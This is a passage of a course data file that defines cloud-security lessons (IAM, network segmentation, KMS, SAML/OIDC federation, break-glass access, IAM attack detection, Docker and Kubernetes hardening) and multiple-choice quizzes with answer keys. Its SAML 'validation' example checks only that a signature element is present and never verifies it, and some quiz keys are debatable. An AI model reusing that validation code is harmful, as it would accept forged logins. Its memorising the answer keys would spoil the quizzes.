- Regular assessment using automated tools is essential

### References

- AWS Shared Responsibility Model: https://aws.amazon.com/compliance/shared-responsibility-model/
- Azure Shared Responsibility: https://docs.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility
- GCP Shared Responsibility: https://cloud.google.com/shared-responsibility-model`,
            questions: [
              { text: 'In IaaS, what is the customer responsible for securing?', answers: [{ text: 'Operating system, middleware, runtime, data, and applications', isCorrect: true }, { text: 'Physical hardware and networking', isCorrect: false }, { text: 'Only the application code', isCorrect: false }, { text: 'Nothing, the provider handles everything', isCorrect: false }] },
              { text: 'What is the leading cause of cloud security breaches?', answers: [{ text: 'Cloud misconfiguration', isCorrect: true }, { text: 'Provider infrastructure vulnerabilities', isCorrect: false }, { text: 'DDoS attacks', isCorrect: false }, { text: 'Insider threats exclusively', isCorrect: false }] },
              { text: 'What does CSPM stand for?', answers: [{ text: 'Cloud Security Posture Management', isCorrect: true }, { text: 'Cloud Service Provider Management', isCorrect: false }, { text: 'Centralized Security Policy Module', isCorrect: false }, { text: 'Cloud System Protection Manager', isCorrect: false }] },
              { text: 'In SaaS, what is the customer responsible for?', answers: [{ text: 'Data classification, user access controls, and provider security settings', isCorrect: true }, { text: 'OS and middleware security', isCorrect: false }, { text: 'Physical data center security', isCorrect: false }, { text: 'Network infrastructure configuration', isCorrect: false }] },
            ],
          },
          {
            title: 'Cloud Network Security Architecture',
            order: 2,
            content: `# Cloud Network Security Architecture

### Learning Objectives

- Design secure VPC/VNet architectures with proper segmentation
- Implement network security groups and firewall rules
- Configure private connectivity and VPN architectures
- Deploy cloud-native firewall services

### Section 1: Virtual Network Design

Cloud networking begins with virtual private clouds (VPC). A well-designed VPC implements defense in depth through network segmentation: public subnets for load balancers, private application subnets for compute, private data subnets for databases, and isolated management subnets for bastion hosts.

### Section 2: Security Groups and Firewalls

Security groups operate at the instance level and are stateful. Network ACLs operate at the subnet level and are stateless. Cloud-native firewalls (AWS Network Firewall, Azure Firewall, GCP Cloud Firewall) provide stateful inspection at the VPC level.

### Section 3: Private Connectivity

VPC Peering connects two VPCs. Transit Gateway is a central hub connecting multiple VPCs. VPN Gateway provides encrypted tunnels to on-premises networks. Private Link enables private connectivity to services without internet exposure.

\`\`\`bash
# AWS Security Group example
aws ec2 create-security-group --group-name web-sg --description "Web server SG"
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 443 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id sg-xxx --protocol tcp --port 22 --source-group sg-bastion
\`\`\`

### Section 4: DDoS Protection

AWS Shield Standard provides basic DDoS protection. Shield Advanced offers enhanced protection with cost protection. Azure DDoS Protection provides adaptive tuning. CloudFlare and Akamai provide CDN-based protection.

### Hands-On Practice

1. Design a three-tier VPC architecture with proper segmentation.
2. Configure security groups with least-privilege access.
3. Set up VPC peering between two VPCs with controlled routing.

### Key Takeaways

- Network segmentation is the foundation of cloud network security
- Security groups are stateful; Network ACLs are stateless
- Private connectivity reduces internet exposure
- DDoS protection should be layered with CDN and cloud-native services

### References

- AWS VPC Security: https://docs.aws.amazon.com/vpc/
- Azure Network Security: https://docs.microsoft.com/en-us/azure/virtual-network/
- GCP VPC Firewall Rules: https://cloud.google.com/vpc/docs/firewalls`,
            questions: [
              { text: 'What type of firewall operates at the instance level in AWS?', answers: [{ text: 'Security Groups', isCorrect: true }, { text: 'Network ACLs', isCorrect: false }, { text: 'AWS Network Firewall', isCorrect: false }, { text: 'Route Tables', isCorrect: false }] },
              { text: 'Which AWS service provides a central hub for connecting multiple VPCs?', answers: [{ text: 'Transit Gateway', isCorrect: true }, { text: 'VPC Peering', isCorrect: false }, { text: 'Direct Connect', isCorrect: false }, { text: 'Internet Gateway', isCorrect: false }] },
              { text: 'What is the key difference between Security Groups and Network ACLs?', answers: [{ text: 'Security Groups are stateful; Network ACLs are stateless', isCorrect: true }, { text: 'Security Groups are stateless; Network ACLs are stateful', isCorrect: false }, { text: 'They are identical', isCorrect: false }, { text: 'Network ACLs operate at instance level', isCorrect: false }] },
              { text: 'What service provides private connectivity without internet exposure?', answers: [{ text: 'Private Link', isCorrect: true }, { text: 'Internet Gateway', isCorrect: false }, { text: 'NAT Gateway', isCorrect: false }, { text: 'VPC Endpoints', isCorrect: false }] },
            ],
          },
          {
            title: 'Cloud IAM Deep-Dive',
            order: 3,
            content: `# Cloud IAM Deep-Dive

### Learning Objectives

- Design least-privilege IAM policies for cloud environments
- Implement multi-factor authentication across cloud accounts
- Configure federated identity and single sign-on
- Audit IAM configurations for security weaknesses

### Section 1: IAM Architecture

IAM is the cornerstone of cloud security controlling who can access what resources and what actions they perform. Components include users/principals that authenticate, groups with shared permissions, roles assumed by users or services, and policies defining allowed or denied actions. Understanding the relationship between these components is essential for designing secure access control.

### Section 2: Least Privilege Implementation

Start with no permissions and add only what is needed. Use Access Analyzer to find unused permissions. Apply resource-based restrictions. Use condition keys for context-aware permissions. Conduct regular reviews. Overly permissive policies are the leading cause of cloud breaches.

\`\`\`python
# Example: Least-privilege IAM policy
import json

policy = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": [
                "s3:GetObject",
                "s3:PutObject"
            ],
            "Resource": "arn:aws:s3:::my-bucket/*",
            "Condition": {
                "StringEquals": {
                    "aws:RequestedRegion": "us-east-1"
                }
            }
        }
    ]
}
\`\`\`

### Section 3: MFA and Federation

MFA prevents account compromise even with stolen passwords. Options include virtual authenticator apps, hardware tokens (YubiKey), and U2F/FIDO2. Enforce MFA for all users using SCPs. Federate cloud identity with existing identity providers using SAML 2.0 or OIDC to eliminate separate credentials and enable centralized access management.

### Section 4: IAM Security Best Practices

Enable MFA for all users. Use roles instead of access keys for services. Rotate keys every 90 days. Monitor changes through CloudTrail. Conduct quarterly access reviews. Use IAM Access Analyzer to identify unused permissions and external access.

### Hands-On Practice

1. Configure IAM for a multi-account environment with least-privilege policies.
2. Enforce MFA using Service Control Policies.
3. Run Access Analyzer to find and remediate issues.

### Key Takeaways

- Least privilege is the fundamental IAM principle
- MFA is mandatory for all cloud accounts
- Federated identity eliminates separate credentials
- Regular audits using Access Analyzer identify security gaps

### References

- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
- Azure AD Security: https://docs.microsoft.com/en-us/azure/active-directory/roles/
- GCP IAM Best Practices: https://cloud.google.com/iam/docs/best-practices`,
            questions: [
              { text: 'What is the principle of least privilege?', answers: [{ text: 'Granting only the minimum permissions necessary', isCorrect: true }, { text: 'Giving all users admin access', isCorrect: false }, { text: 'Using same permissions for everyone', isCorrect: false }, { text: 'Granting maximum permissions for convenience', isCorrect: false }] },
              { text: 'Which MFA option provides strongest protection?', answers: [{ text: 'Hardware tokens like YubiKey', isCorrect: true }, { text: 'SMS verification', isCorrect: false }, { text: 'Security questions', isCorrect: false }, { text: 'Email verification', isCorrect: false }] },
              { text: 'What tool identifies unused IAM permissions in AWS?', answers: [{ text: 'IAM Access Analyzer', isCorrect: true }, { text: 'AWS Shield', isCorrect: false }, { text: 'CloudTrail', isCorrect: false }, { text: 'AWS Config', isCorrect: false }] },
              { text: 'How often should service account keys be rotated?', answers: [{ text: 'At minimum every 90 days', isCorrect: true }, { text: 'Once per year', isCorrect: false }, { text: 'Never if using MFA', isCorrect: false }, { text: 'Only when compromised', isCorrect: false }] },
            ],
          },
          {
            title: 'Cloud Data Protection & Encryption',
            order: 4,
            content: `# Cloud Data Protection & Encryption

### Learning Objectives

- Implement encryption at rest and in transit for cloud data
- Manage encryption keys using cloud KMS services
- Configure data classification and loss prevention
- Understand data residency and sovereignty requirements

### Section 1: Encryption at Rest

Cloud providers encrypt data at rest by default using AES-256 with provider-managed keys. Customer-managed keys (CMK) provide greater control through cloud KMS services. Customer-provided keys offer maximum control but require complete key management.

### Section 2: Key Management Services

AWS KMS integrates with most AWS services and supports HSM-backed keys. Azure Key Vault provides HSM-backed keys with RBAC integration. Google Cloud KMS offers global key management with Cloud HSM. Best practices include automatic key rotation, separated key management duties, audit logging, and deletion safeguards.

\`\`\`python
# Example: Using AWS KMS for encryption
import boto3

kms = boto3.client('kms')

# Create a customer-managed key
response = kms.create_key(
    Description='Data encryption key',
    KeyUsage='ENCRYPT_DECRYPT',
    Tags=[{'TagKey': 'Purpose', 'TagValue': 'data-protection'}]
)
key_id = response['KeyMetadata']['KeyId']

# Enable automatic key rotation
kms.enable_key_rotation(KeyId=key_id)

# Encrypt data
encrypted = kms.encrypt(KeyId=key_id, Plaintext=b'sensitive data')
\`\`\`

### Section 3: Data Loss Prevention

AWS Macie discovers sensitive data in S3. Azure Information Protection classifies documents. Google Cloud DLP inspects and redacts sensitive data across services. DLP policies should be configured to detect PII, PHI, PCI data, and intellectual property.

### Section 4: Data Residency

Data residency laws require data within geographic boundaries. AWS SCPs, Azure Policy, and GCP Organization Policies enforce geographic restrictions. Multi-region architectures must account for data transfer regulations including GDPR and industry-specific requirements.

### Hands-On Practice

1. Configure encryption at rest for S3 buckets using customer-managed KMS keys.
2. Deploy Amazon Macie to scan for sensitive data in S3.
3. Implement geo-restriction policies to prevent data leaving approved regions.

### Key Takeaways

- CMKs provide greater control over encryption than provider-managed keys
- Key management requires separated duties and audit logging
- DLP tools automatically discover and classify sensitive data
- Data residency requirements must be enforced through policy

### References

- AWS KMS: https://docs.aws.amazon.com/kms/
- Azure Key Vault: https://docs.microsoft.com/en-us/azure/key-vault/
- Google Cloud KMS: https://cloud.google.com/kms/`,
            questions: [
              { text: 'What encryption standard is used for cloud data at rest?', answers: [{ text: 'AES-256', isCorrect: true }, { text: 'RSA-2048', isCorrect: false }, { text: 'DES-56', isCorrect: false }, { text: 'Blowfish-448', isCorrect: false }] },
              { text: 'What does CMK stand for?', answers: [{ text: 'Customer-Managed Key', isCorrect: true }, { text: 'Cloud Master Key', isCorrect: false }, { text: 'Centralized Metadata Key', isCorrect: false }, { text: 'Cryptographic Management Key', isCorrect: false }] },
              { text: 'Which AWS service discovers sensitive data in S3?', answers: [{ text: 'Amazon Macie', isCorrect: true }, { text: 'AWS Shield', isCorrect: false }, { text: 'AWS WAF', isCorrect: false }, { text: 'Amazon GuardDuty', isCorrect: false }] },
              { text: 'What is the minimum recommended TLS version?', answers: [{ text: 'TLS 1.2', isCorrect: true }, { text: 'TLS 1.0', isCorrect: false }, { text: 'SSL 3.0', isCorrect: false }, { text: 'TLS 1.1', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'IAM, Access Control & Hardening',
        order: 2,
        lessons: [
          {
            title: 'Cloud IAM Policies & Permissions',
            order: 1,
            content: `# Cloud IAM Policies & Permissions

### Learning Objectives

- Design and implement IAM policies for cloud environments
- Understand policy evaluation logic and deny rules
- Implement condition-based access controls
- Audit and remediate overly permissive policies

### Section 1: Policy Types and Structure

Cloud IAM policies come in several forms. Identity-based policies attach to users, groups, or roles. Resource-based policies attach to resources. Permission boundaries cap maximum permissions. Service Control Policies (SCPs) set guardrails at the organization level. Session policies restrict temporary credentials. Understanding how these policy types interact is critical for implementing least privilege.

### Section 2: Policy Evaluation Logic

When multiple policies apply, the evaluation follows specific rules. Deny always wins over allow. If no explicit deny exists and at least one allow matches, the action is permitted. Implicit deny means actions not explicitly allowed are denied. This evaluation order means administrators can use SCPs to set hard boundaries that cannot be overridden by individual permissions.

### Section 3: Condition-Based Access

Condition keys enable context-aware access control. Common conditions include source IP ranges, time-based restrictions, multi-factor authentication status, and resource tags. Conditions enable scenarios like restricting admin access to corporate networks, requiring MFA for sensitive operations, and enforcing tag-based access control.

\`\`\`python
# Example: Condition-based IAM policy
policy = {
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "ec2:TerminateInstances",
            "Resource": "*",
            "Condition": {
                "StringEquals": {
                    "aws:RequestedRegion": "us-east-1",
                    "ec2:ResourceTag/Environment": "development"
                },
                "Bool": {
                    "aws:MultiFactorAuthPresent": "true"
                }
            }
        }
    ]
}
\`\`\`

### Section 4: Policy Audit and Remediation

IAM Access Analyzer identifies unused permissions and external access. AWS Config rules detect overly permissive policies. Custom Lambda functions can evaluate policies against organizational standards. Regular access reviews ensure permissions remain appropriate as roles change.

### Hands-On Practice

1. Create an IAM policy that restricts access based on MFA status, source IP, and resource tags.
2. Use Access Analyzer to identify and remove unused permissions.
3. Implement SCPs that prevent any account from disabling CloudTrail.

### Key Takeaways

- Deny always wins in policy evaluation
- Condition keys enable context-aware access control
- Permission boundaries and SCPs provide defense-in-depth
- Regular policy audits prevent permission creep

### References

- AWS IAM Policy Evaluation: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_evaluation-logic.html
- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html`,
            questions: [
              { text: 'In IAM policy evaluation, what always wins?', answers: [{ text: 'Explicit deny', isCorrect: true }, { text: 'Explicit allow', isCorrect: false }, { text: 'Implicit deny', isCorrect: false }, { text: 'The most recent policy', isCorrect: false }] },
              { text: 'What does an IAM permission boundary do?', answers: [{ text: 'Caps the maximum permissions regardless of attached policies', isCorrect: true }, { text: 'Grants all permissions', isCorrect: false }, { text: 'Creates a firewall for IAM', isCorrect: false }, { text: 'Logs all IAM changes', isCorrect: false }] },
              { text: 'What condition key enforces MFA for an action?', answers: [{ text: 'aws:MultiFactorAuthPresent', isCorrect: true }, { text: 'aws:MFARequired', isCorrect: false }, { text: 'iam:MFAEnabled', isCorrect: false }, { text: 'sts:MFAToken', isCorrect: false }] },
              { text: 'What tool identifies unused IAM permissions?', answers: [{ text: 'IAM Access Analyzer', isCorrect: true }, { text: 'AWS Shield', isCorrect: false }, { text: 'CloudTrail', isCorrect: false }, { text: 'AWS Config', isCorrect: false }] },
            ],
          },
          {
            title: 'Identity Federation & SSO',
            order: 2,
            content: `# Identity Federation & SSO

### Learning Objectives

- Implement identity federation between cloud and enterprise identity providers
- Configure SAML 2.0 and OIDC-based authentication
- Deploy cloud-native single sign-on solutions
- Manage cross-account access patterns

### Section 1: Federation Fundamentals

Identity federation eliminates separate cloud credentials by leveraging existing enterprise identity. Users authenticate against their primary identity provider (Active Directory, Okta, Ping Identity) and receive temporary cloud credentials. This approach centralizes identity management, enables consistent access policies, and simplifies offboarding.

### Section 2: SAML 2.0 Integration

SAML 2.0 is the standard protocol for enterprise federation. The identity provider (IdP) authenticates users and issues SAML assertions. The service provider (SP) trusts the IdP and grants access based on assertions. AWS, Azure, and GCP all support SAML 2.0 federation with common enterprise IdPs.

\`\`\`python
# SAML assertion validation example
import xml.etree.ElementTree as ET
from datetime import datetime

def validate_saml_assertion(assertion_xml, idp_certificate):
    root = ET.fromstring(assertion_xml)
    ns = {'saml': 'urn:oasis:names:tc:SAML:2.0:assertion'}

    # Validate signature
    signature = root.find('.//saml:Signature', ns)
    if signature is None:
        raise ValueError("No signature found")

    # Check conditions (notBefore, notOnOrAfter)
    conditions = root.find('.//saml:Conditions', ns)
    if conditions is not None:
        not_before = conditions.get('NotBefore')
        not_on_or_after = conditions.get('NotOnOrAfter')
        now = datetime.utcnow()
        # Validate time conditions
        if not_before and now < datetime.fromisoformat(not_before):
            raise ValueError("Assertion not yet valid")
        if not_on_or_after and now > datetime.fromisoformat(not_on_or_after):
            raise ValueError("Assertion expired")

    return True
\`\`\`

### Section 3: OIDC and Modern Authentication

OpenID Connect (OIDC) provides a modern alternative to SAML for cloud-native applications. OIDC is built on OAuth 2.0 and uses JSON-based tokens. It is simpler to implement for web and mobile applications. AWS, Azure, and GCP support OIDC federation for workload identity.

### Section 4: Cross-Account Access Patterns

Cross-account access enables resources in one account to be accessed from another. IAM roles with trust relationships are the primary mechanism. Cross-account access should follow least privilege, use external IDs for third-party access, and be regularly audited.

### Hands-On Practice

1. Configure SAML 2.0 federation between an IdP and AWS.
2. Set up OIDC federation for a Kubernetes cluster to access cloud resources.
3. Implement cross-account role assumption with external ID conditions.

### Key Takeaways

- Federation eliminates separate cloud credentials
- SAML 2.0 is the standard for enterprise federation
- OIDC provides modern, simpler authentication for cloud-native apps
- Cross-account access requires careful trust relationship management

### References

- AWS Federation: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_saml.html
- Azure AD Federation: https://docs.microsoft.com/en-us/azure/active-directory/hybrid/`,
            questions: [
              { text: 'What is the primary benefit of identity federation?', answers: [{ text: 'Eliminates separate cloud credentials by leveraging existing enterprise identity', isCorrect: true }, { text: 'Makes cloud resources faster', isCorrect: false }, { text: 'Reduces cloud costs', isCorrect: false }, { text: 'Eliminates the need for MFA', isCorrect: false }] },
              { text: 'What is the standard protocol for enterprise federation?', answers: [{ text: 'SAML 2.0', isCorrect: true }, { text: 'HTTP/1.1', isCorrect: false }, { text: 'FTP', isCorrect: false }, { text: 'SMTP', isCorrect: false }] },
              { text: 'What provides modern, simpler authentication for cloud-native apps?', answers: [{ text: 'OpenID Connect (OIDC)', isCorrect: true }, { text: 'SAML 1.0', isCorrect: false }, { text: 'LDAP', isCorrect: false }, { text: 'Kerberos', isCorrect: false }] },
              { text: 'What is the primary mechanism for cross-account access?', answers: [{ text: 'IAM roles with trust relationships', isCorrect: true }, { text: 'Shared access keys', isCorrect: false }, { text: 'VPN connections', isCorrect: false }, { text: 'Direct API calls', isCorrect: false }] },
            ],
          },
          {
            title: 'Privileged Access Management',
            order: 3,
            content: `# Privileged Access Management

### Learning Objectives

- Implement just-in-time access for privileged operations
- Configure break-glass emergency access procedures
- Monitor and audit privileged activities
- Deploy privileged access workstations

### Section 1: Just-In-Time Access

Just-in-time (JIT) access provides temporary privileged access only when needed. Instead of standing admin privileges, users request time-limited access that automatically expires. This dramatically reduces the attack surface of privileged accounts. Azure PIM provides JIT access with approval workflows. AWS SSO supports session policies that limit duration and permissions.

### Section 2: Break-Glass Procedures

Break-glass procedures provide emergency access when normal channels are unavailable. These accounts should be protected with hardware MFA, have credentials stored in sealed envelopes or secure vaults, be used only in documented emergencies, and trigger immediate alerts when activated.

\`\`\`python
# Break-glass access request example
import boto3
import json
from datetime import datetime, timedelta

def request_breakglass_access(reason, duration_hours=4):
    sts = boto3.client('sts')

    # Assume break-glass role with session policy
    response = sts.assume_role(
        RoleArn='arn:aws:iam::123456789012:role/BreakGlassAdmin',
        RoleSessionName=f'breakglass-{datetime.now().isoformat()}',
        DurationSeconds=duration_hours * 3600,
        Tags=[
            {'Key': 'BreakGlass', 'Value': 'true'},
            {'Key': 'Reason', 'Value': reason},
            {'Key': 'RequestTime', 'Value': datetime.now().isoformat()}
        ]
    )

    # Send alert notification
    sns = boto3.client('sns')
    sns.publish(
        TopicArn='arn:aws:sns:us-east-1:123456789012:security-alerts',
        Subject='BREAK-GLASS ACCESS ACTIVATED',
        Message=f'Break-glass access activated. Reason: {reason}. Duration: {duration_hours}h'
    )

    return response['Credentials']
\`\`\`

### Section 3: Privileged Access Workstations

Privileged access workstations (PAWs) are dedicated, hardened systems used for administrative tasks. They should be isolated from general browsing, have enhanced monitoring, use hardware MFA, and be managed through a separate administrative tier. The PAW approach implements network segmentation for administrative access.

### Section 4: Monitoring and Auditing

All privileged activities must be logged and monitored. Enable CloudTrail for API logging. Use session recording for terminal access. Implement real-time alerting for suspicious privileged activities. Conduct quarterly access reviews for all privileged accounts.

### Hands-On Practice

1. Implement JIT access using Azure PIM for admin role activation.
2. Create a break-glass account with proper protections and alerting.
3. Configure CloudTrail logging and alerting for all IAM changes.

### Key Takeaways

- JIT access dramatically reduces the attack surface of privileged accounts
- Break-glass procedures must be documented, tested, and protected
- PAWs implement network segmentation for administrative access
- All privileged activities must be logged and monitored

### References

- Azure PIM: https://docs.microsoft.com/en-us/azure/active-directory/privileged-identity-management/
- AWS IAM Roles: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles.html`,
            questions: [
              { text: 'What is just-in-time (JIT) access?', answers: [{ text: 'Temporary privileged access that automatically expires', isCorrect: true }, { text: 'Permanent admin access', isCorrect: false }, { text: 'Access to physical servers', isCorrect: false }, { text: 'Access during business hours only', isCorrect: false }] },
              { text: 'How should break-glass accounts be protected?', answers: [{ text: 'Hardware MFA, sealed credentials, and immediate alerts on activation', isCorrect: true }, { text: 'Same as regular accounts', isCorrect: false }, { text: 'No special protection needed', isCorrect: false }, { text: 'Shared among team members', isCorrect: false }] },
              { text: 'What is a Privileged Access Workstation?', answers: [{ text: 'A dedicated, hardened system used for administrative tasks', isCorrect: true }, { text: 'Any workstation with admin rights', isCorrect: false }, { text: 'A mobile device for remote access', isCorrect: false }, { text: 'A shared computer in the office', isCorrect: false }] },
              { text: 'Why must all privileged activities be logged?', answers: [{ text: 'To detect misuse and maintain accountability', isCorrect: true }, { text: 'Because logs are required for compliance only', isCorrect: false }, { text: 'To improve performance', isCorrect: false }, { text: 'It is optional for security', isCorrect: false }] },
            ],
          },
          {
            title: 'IAM Attack Detection & Response',
            order: 4,
            content: `# IAM Attack Detection & Response

### Learning Objectives

- Detect IAM-based attacks in cloud environments
- Identify privilege escalation vectors
- Respond to compromised credentials
- Implement IAM monitoring and alerting

### Section 1: Common IAM Attacks

IAM attacks include credential stuffing, brute force attacks, permission escalation through policy manipulation, and exploitation of misconfigured trust relationships. Attackers who gain IAM access can create backdoors, exfiltrate data, and establish persistence. Detection requires monitoring IAM events through CloudTrail and implementing real-time alerting.

### Section 2: Privilege Escalation Detection

Privilege escalation in cloud environments occurs when compromised identities modify policies. Key indicators include AttachRolePolicy, PutRolePolicy, CreatePolicyVersion, and iam:PassRole events combined with service creation. Monitoring these events and correlating with other suspicious activity enables early detection.

\`\`\`python
# Privilege escalation detection
import boto3
from datetime import datetime, timedelta

cloudtrail = boto3.client('cloudtrail')

def detect_privilege_escalation(hours=1):
    end_time = datetime.utcnow()
    start_time = end_time - timedelta(hours=hours)

    events = cloudtrail.lookup_events(
        LookupAttributes=[{
            'AttributeKey': 'EventName',
            'AttributeValue': 'AttachRolePolicy'
        }],
        StartTime=start_time,
        EndTime=end_time
    )

    alerts = []
    for event in events['Events']:
        source_ip = event.get('Username', 'unknown')
        role_name = event.get('Resources', [{}])[0].get('ResourceName', 'unknown')

        alerts.append({
            'event': 'privilege_escalation',
            'severity': 'critical',
            'source_ip': source_ip,
            'role': role_name,
            'timestamp': event['EventTime'].isoformat()
        })

    return alerts
\`\`\`

### Section 3: Responding to Compromised Credentials

When credentials are suspected compromised: immediately rotate or delete access keys, revoke active sessions, review recent activity through CloudTrail, assess the scope of potential damage, check for backdoor accounts or policies, and notify affected parties.

### Section 4: IAM Monitoring and Alerting

AWS CloudTrail logs all API activity. AWS Config tracks configuration changes. GuardDuty provides threat detection. Implement alerting for IAM changes, unusual API patterns, and suspicious login activity. Use EventBridge to route alerts to appropriate response teams.

### Hands-On Practice

1. Create CloudTrail alerts for IAM policy changes and privilege escalation indicators.
2. Simulate a privilege escalation attack in a sandbox and detect it through monitoring.
3. Develop a compromised credential response playbook for cloud environments.

### Key Takeaways

- IAM attacks are high-impact and require immediate response
- Privilege escalation detection requires monitoring specific IAM API events
- Credential compromise response must be swift and comprehensive
- CloudTrail and GuardDuty provide essential IAM monitoring capabilities

### References

- AWS CloudTrail: https://docs.aws.amazon.com/cloudtrail/
- AWS GuardDuty: https://docs.aws.amazon.com/guardduty/
- MITRE ATT&CK Cloud: https://attack.mitre.org/matrices/enterprise/cloud/`,
            questions: [
              { text: 'What event indicates potential privilege escalation?', answers: [{ text: 'AttachRolePolicy or PutRolePolicy events', isCorrect: true }, { text: 's3:GetObject', isCorrect: false }, { text: 'ec2:DescribeInstances', isCorrect: false }, { text: 'cloudwatch:GetMetricData', isCorrect: false }] },
              { text: 'What is the first step when credentials are suspected compromised?', answers: [{ text: 'Immediately rotate or delete access keys and revoke sessions', isCorrect: true }, { text: 'Wait and see if anything happens', isCorrect: false }, { text: 'Only change the password', isCorrect: false }, { text: 'Disable all cloud services', isCorrect: false }] },
              { text: 'What AWS service provides threat detection for IAM events?', answers: [{ text: 'Amazon GuardDuty', isCorrect: true }, { text: 'AWS Shield', isCorrect: false }, { text: 'AWS WAF', isCorrect: false }, { text: 'Amazon Inspector', isCorrect: false }] },
              { text: 'What logs all API activity in AWS?', answers: [{ text: 'AWS CloudTrail', isCorrect: true }, { text: 'Amazon CloudWatch', isCorrect: false }, { text: 'AWS Config', isCorrect: false }, { text: 'VPC Flow Logs', isCorrect: false }] },
            ],
          },
        ],
      },
      {
        title: 'Container & Serverless Security',
        order: 3,
        lessons: [
          {
            title: 'Docker Security Hardening',
            order: 1,
            content: `# Docker Security Hardening

### Learning Objectives

- Write secure Dockerfiles following best practices
- Scan container images for vulnerabilities
- Implement runtime security controls
- Secure Docker daemon and orchestration

### Section 1: Secure Dockerfiles

Use minimal base images (Distroless, Alpine). Implement multi-stage builds to reduce attack surface. Never run as root. Pin versions with specific tags. Do not store secrets in images. Use COPY instead of ADD. Add HEALTHCHECK instructions.

\`\`\`dockerfile
# Secure Dockerfile example
FROM node:18-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
RUN npm run build

FROM gcr.io/distroless/nodejs18-debian12
COPY --from=builder /app/dist /app
COPY --from=builder /app/node_modules /app/node_modules
USER nonroot
EXPOSE 3000
CMD ["app/server.js"]
\`\`\`

### Section 2: Vulnerability Scanning

Trivy and Grype scan images for known CVEs. Integrate into CI/CD to catch issues before deployment. Scan registries continuously. Base image updates should trigger automatic rescans.

### Section 3: Runtime Security

Seccomp profiles restrict system calls. AppArmor and SELinux provide mandatory access control. Read-only filesystems prevent modification. Resource limits prevent exhaustion. Drop unnecessary Linux capabilities.

### Section 4: Docker Daemon Security

Use TLS for daemon communication. Restrict socket access. Use rootless Docker. Enable user namespaces. Limit container resources. Content trust ensures image integrity.

### Hands-On Practice

1. Write a secure Dockerfile with multi-stage builds and non-root user.
2. Scan images with Trivy and remediate critical vulnerabilities.
3. Run containers with read-only filesystem and restricted capabilities.

### Key Takeaways

- Start with minimal, scanned, signed images
- Never run containers as root
- Runtime controls limit escape possibilities
- Scanning must be automated in CI/CD

### References

- Docker Security: https://docs.docker.com/engine/security/
- CIS Docker Benchmark: https://www.cisecurity.org/benchmark/docker`,
            questions: [
              { text: 'Why should you never run containers as root?', answers: [{ text: 'Container root can potentially escape and gain host root access', isCorrect: true }, { text: 'It slows down the container', isCorrect: false }, { text: 'It uses more memory', isCorrect: false }, { text: 'Not supported by Docker', isCorrect: false }] },
              { text: 'What does a multi-stage Docker build accomplish?', answers: [{ text: 'Reduces final image size and attack surface', isCorrect: true }, { text: 'Makes builds faster only', isCorrect: false }, { text: 'Adds more security features', isCorrect: false }, { text: 'Enables Docker Swarm', isCorrect: false }] },
              { text: 'Which tool scans container images for CVEs?', answers: [{ text: 'Trivy', isCorrect: true }, { text: 'Docker Scout', isCorrect: false }, { text: 'Kubectl', isCorrect: false }, { text: 'Terraform', isCorrect: false }] },
              { text: 'What does a read-only root filesystem prevent?', answers: [{ text: 'Modification of binaries or planting backdoors', isCorrect: true }, { text: 'Network connections', isCorrect: false }, { text: 'Process execution', isCorrect: false }, { text: 'Memory allocation', isCorrect: false }] },
            ],
          },
          {
            title: 'Kubernetes Security',
            order: 2,
            content: `# Kubernetes Security

### Learning Objectives

- Secure cluster configuration and access controls
- Implement pod security standards
- Configure network policies for microsegmentation
- Secure secrets management

### Section 1: Cluster Security

The API server is the crown jewel. Disable anonymous auth, enable RBAC, use admission controllers, and enforce TLS 1.2+. RBAC determines who can do what — create Roles with minimum permissions and bind them to service accounts.

### Section 2: Pod Security Standards

Three levels: Privileged for system components, Baseline preventing known escalations, and Restricted for applications. Enforce at namespace level. Security contexts should specify non-root users, no privilege escalation, read-only filesystems, and dropped capabilities.

\`\`\`yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
  containers:
  - name: app
    image: myapp:1.0
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
\`\`\`

### Section 3: Network Policies

Default deny all ingress, then allow specific communication paths. This implements microsegmentation limiting blast radius. Network policies are enforced by the CNI plugin (Calico, Cilium, Weave).

### Section 4: Secrets Management

Enable etcd encryption at rest. Use external secrets operators (Vault, AWS Secrets Manager). Mount as volumes not environment variables. Rotate regularly. Never commit secrets to Git.

### Hands-On Practice

1. Deploy a hardened namespace with Pod Security Standards and Network Policies.
2. Configure RBAC with least-privilege roles for application service accounts.
3. Set up external secrets operator for production secret management.

### Key Takeaways

- RBAC must follow least privilege
- Pod security standards provide defense-in-depth
- Network policies limit blast radius
- Secrets need external management for production

### References

- Kubernetes Security: https://kubernetes.io/docs/concepts/security/
- CIS Kubernetes Benchmark: https://www.cisecurity.org/benchmark/kubernetes`,
            questions: [
              { text: 'What is the most restrictive pod security standard?', answers: [{ text: 'Restricted', isCorrect: true }, { text: 'Privileged', isCorrect: false }, { text: 'Baseline', isCorrect: false }, { text: 'Standard', isCorrect: false }] },
              { text: 'What does a default deny network policy do?', answers: [{ text: 'Blocks all traffic until explicitly allowed', isCorrect: true }, { text: 'Allows all traffic', isCorrect: false }, { text: 'Only blocks external traffic', isCorrect: false }, { text: 'Disables pod networking', isCorrect: false }] },
              { text: 'How should Kubernetes Secrets be stored for production?', answers: [{ text: 'Using external secrets operators with encryption at rest', isCorrect: true }, { text: 'As plain base64 values', isCorrect: false }, { text: 'In environment variables only', isCorrect: false }, { text: 'Hardcoded in deployment files', isCorrect: false }] },
